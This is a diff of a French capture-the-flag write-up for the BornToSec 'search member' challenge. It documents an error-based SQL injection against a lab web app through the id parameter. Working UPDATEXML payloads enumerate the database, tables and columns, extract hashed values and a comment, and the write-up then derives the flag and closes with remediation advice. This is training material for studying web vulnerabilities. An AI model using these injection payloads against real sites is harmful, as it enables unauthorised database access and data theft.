@@ -7,23 +7,11 @@ Page vulnérable : index.php?page=member
 
 1. Contexte et objectif
 
-Dans le cadre du WebEx BornToSec, ce challenge consiste à identifier et exploiter une vulnérabilité d’injection SQL de type error-based présente dans la fonctionnalité de recherche des membres.
+L’objectif est d’identifier et d’exploiter une injection SQL error-based via la fonctionnalité Search member by ID, sans outils automatisés, uniquement via le champ web. L’exploitation doit permettre l’énumération de la base et la récupération du flag final selon la logique applicative.
 
-Les objectifs sont :
+2. Surface d’attaque
 
-confirmer la présence d’une injection SQL,
-
-exploiter la vulnérabilité via le champ web uniquement,
-
-extraire les données de la base,
-
-appliquer la logique applicative attendue,
-
-obtenir et valider le flag final.
-
-2. Identification de la surface d’attaque
-
-La page member contient un formulaire de recherche utilisant la méthode GET :
+Formulaire (méthode GET) :
 
 <form method="GET">
   <input type="hidden" name="page" value="member">
@@ -32,33 +20,35 @@ La page member contient un formulaire de recherche utilisant la méthode GET :
 </form>
 
 
-L’URL générée est :
+URL finale :
 
 http://192.168.133.142/index.php?page=member&id=VALUE
 
 
-Le paramètre id est directement contrôlé par l’utilisateur.
+Paramètre contrôlé : id
 
-3. Validation de la vulnérabilité SQL
-Test initial
+3. Confirmation de la vulnérabilité SQL
+3.1 Test d’erreur simple
 
 Entrée dans le champ ID :
 
 1'
 
 
-Résultat :
+Résultat observé :
 
-message d’erreur SQL MariaDB visible côté client.
+Message d’erreur SQL MariaDB affiché côté client.
 
-➡️ Injection SQL confirmée, avec affichage d’erreurs exploitables.
+➡️ Injection SQL confirmée (affichage d’erreurs).
 
-4. Exploitation error-based
+4. Mise en place du canal error-based
 
-Le SGBD utilisé est MariaDB.
-La fonction UPDATEXML() est utilisée pour provoquer des erreurs SQL contenant des données arbitraires.
+Le SGBD est MariaDB. La fonction UPDATEXML() permet de forcer une erreur XML contenant des données arbitraires.
 
-Test du canal error-based
+4.1 Test du canal
+
+ID :
+
 1 AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)
 
 
@@ -67,14 +57,19 @@ Résultat :
 XPATH syntax error: '~Member_Sql_Injection~'
 
 
-➡️ Le canal error-based SQL injection est fonctionnel.
+➡️ Le canal error-based est fonctionnel.
 
 5. Enumération de la base de données
 5.1 Nom de la base
 
-Base de données : Member_Sql_Injection
+Déjà obtenu :
 
-5.2 Enumération des tables
+Member_Sql_Injection
+
+5.2 Enumération des tables (une par une)
+
+ID (table 1) :
+
 1 AND UPDATEXML(1,CONCAT(0x7e,
 (SELECT table_name FROM information_schema.tables
  WHERE table_schema=DATABASE() LIMIT 0,1),
@@ -86,56 +81,127 @@ Résultat :
 ~users~
 
 
-➡️ Une seule table exploitable : users
+ID (table 2) :
 
-6. Enumération des colonnes
-
-Afin d’éviter les problèmes liés aux quotes, le nom de la table est utilisé en hexadécimal :
-
-users = 0x7573657273
-
-
-Colonnes découvertes :
-
-user_id
-
-first_name
-
-last_name
-
-town
-
-country
-
-planet
-
-Commentaire
-
-countersign
-
-7. Extraction des données sensibles
-7.1 Extraction de la colonne countersign
 1 AND UPDATEXML(1,CONCAT(0x7e,
-(SELECT countersign FROM users LIMIT X,1),
+(SELECT table_name FROM information_schema.tables
+ WHERE table_schema=DATABASE() LIMIT 1,1),
 0x7e),1)
 
 
-Valeurs récupérées :
+Résultat :
 
-2b3366bcfd44f540e630d4dc2b9b06d
-60e9032c586fb422e2c16dee6286cf1
-e083b24a01c483437bcf4a9eea7c1b4
-5ff9d0165b4f92b14994e5c685cdce2
+Rien (fin de liste)
+
+➡️ Une seule table : users
+
+6. Enumération des colonnes
+
+Pour éviter les problèmes de quotes, le nom de la table est passé en hexadécimal.
+
+users = 0x7573657273
+
+6.1 Colonnes (itération par LIMIT)
+
+ID (colonne 1) :
+
+1 AND UPDATEXML(1,CONCAT(0x7e,
+(SELECT column_name FROM information_schema.columns
+ WHERE table_name=0x7573657273 LIMIT 0,1),
+0x7e),1)
 
 
-Format : 32 caractères hexadécimaux
+→ user_id
 
-Type : MD5
+ID (colonne 2) :
 
-Conclusion : données intermédiaires, pas le flag final.
+... LIMIT 1,1)
+
+
+→ first_name
+
+ID (colonne 3) :
+
+... LIMIT 2,1)
+
+
+→ last_name
+
+ID (colonne 4) :
+
+... LIMIT 3,1)
+
+
+→ town
+
+ID (colonne 5) :
+
+... LIMIT 4,1)
+
+
+→ country
+
+ID (colonne 6) :
+
+... LIMIT 5,1)
+
+
+→ planet
+
+ID (colonne 7) :
+
+... LIMIT 6,1)
+
+
+→ Commentaire
+
+ID (colonne 8) :
+
+... LIMIT 7,1)
+
+
+→ countersign
+
+7. Extraction des données sensibles
+7.1 Extraction de countersign (MD5)
+
+ID (ligne 1) :
+
+1 AND UPDATEXML(1,CONCAT(0x7e,
+(SELECT countersign FROM users LIMIT 0,1),
+0x7e),1)
+
+
+→ 2b3366bcfd44f540e630d4dc2b9b06d
+
+ID (ligne 2) :
+
+... LIMIT 1,1)
+
+
+→ 60e9032c586fb422e2c16dee6286cf1
+
+ID (ligne 3) :
+
+... LIMIT 2,1)
+
+
+→ e083b24a01c483437bcf4a9eea7c1b4
+
+ID (ligne 4) :
+
+... LIMIT 3,1)
+
+
+→ 5ff9d0165b4f92b14994e5c685cdce2
+
+➡️ Hash MD5 (intermédiaire).
 
 8. Analyse applicative – Utilisateur ID 4
-8.1 Extraction des données claires
+8.1 Données claires (identité)
+
+ID :
+
 1 AND UPDATEXML(1,CONCAT(0x7e,
 (SELECT CONCAT_WS(0x3a,first_name,last_name,planet)
  FROM users LIMIT 3,1),
@@ -146,77 +212,75 @@ Résultat :
 
 ~Flag:GetThe:42~
 
-8.2 Extraction complète du commentaire (par segments)
+8.2 Extraction du commentaire (par segments)
 
-Le commentaire est extrait via SUBSTRING() :
+Partie 1 :
+
+1 AND UPDATEXML(1,CONCAT(0x7e,
+(SELECT SUBSTRING(Commentaire,1,32)
+ FROM users LIMIT 3,1),
+0x7e),1)
+
+
+→ Decrypt this password -> then l
+
+Partie 2 :
+
+... SUBSTRING(Commentaire,33,32) ...
+
+
+→ wer all the char. Sh256 on it a
+
+Partie 3 :
+
+... SUBSTRING(Commentaire,65,32) ...
+
+
+→ d it's good !
+
+Commentaire reconstitué :
 
 Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 
+9. Interprétation de la règle (déduite)
 
-➡️ Le commentaire fournit explicitement la règle de transformation.
-
-9. Interprétation de la règle
-
-La règle indiquée est :
-
-Prendre la valeur en clair associée à l’utilisateur
+Prendre la valeur en clair associée (Flag:GetThe:42)
 
 Mettre tous les caractères en minuscules
 
 Calculer le SHA-256
 
-Le résultat correspond au flag
+Le résultat est le flag
 
-10. Génération du flag final
-Valeur en clair
-Flag:GetThe:42
-
-Mise en minuscules
+10. Génération du flag (commande locale)
+10.1 Mise en minuscules
 flag:getthe:42
 
-Calcul du SHA-256
+10.2 Calcul SHA-256 (Linux/Kali)
 echo -n "flag:getthe:42" | sha256sum
 
-Résultat
+
+Résultat :
+
 659b3665adef36100046ae1b9b51845cd456e93903343721f45e455c0d8311d6
 
 11. Flag validé
-✅ Flag final
 659b3665adef36100046ae1b9b51845cd456e93903343721f45e455c0d8311d6
 
 
-Ce hash correspond exactement à l’un des flags fournis pour le WebEx.
+Correspondance exacte avec la liste de flags fournie.
 
-12. Remédiation
+12. Remédiation (rappel technique)
 
-La vulnérabilité est due à :
+Requêtes préparées (PDO / mysqli)
 
-l’injection directe du paramètre id dans la requête SQL,
-
-l’absence de validation et de typage,
-
-l’affichage des erreurs SQL côté client.
-
-Correctifs recommandés
-
-Utilisation de requêtes préparées
-
-Validation stricte des entrées utilisateur
+Validation stricte du paramètre id (numérique)
 
 Désactivation de l’affichage des erreurs SQL
 
-Application du principe du moindre privilège côté base de données
+Compte SQL à privilèges minimaux
 
-13. Évaluation du risque
-Critère	Évaluation
-Type	Injection SQL
-Exploitabilité	Élevée
-Impact	Exfiltration de données
-Complexité	Faible
-Sévérité	Critique
-14. Conclusion
+13. Conclusion
 
-Ce challenge démontre une injection SQL error-based critique, exploitable via un simple paramètre GET non sécurisé.
-L’exploitation a permis une énumération complète de la base, suivie d’une analyse applicative conduisant à la récupération du flag final en respectant strictement la logique indiquée par l’application.
-
+L’exploitation error-based a permis une énumération complète (base → table → colonnes → données) et une analyse applicative menant au flag final, en respectant strictement les indices fournis par l’application.
 Le challenge search_member_sql_inj_error_based est entièrement validé.
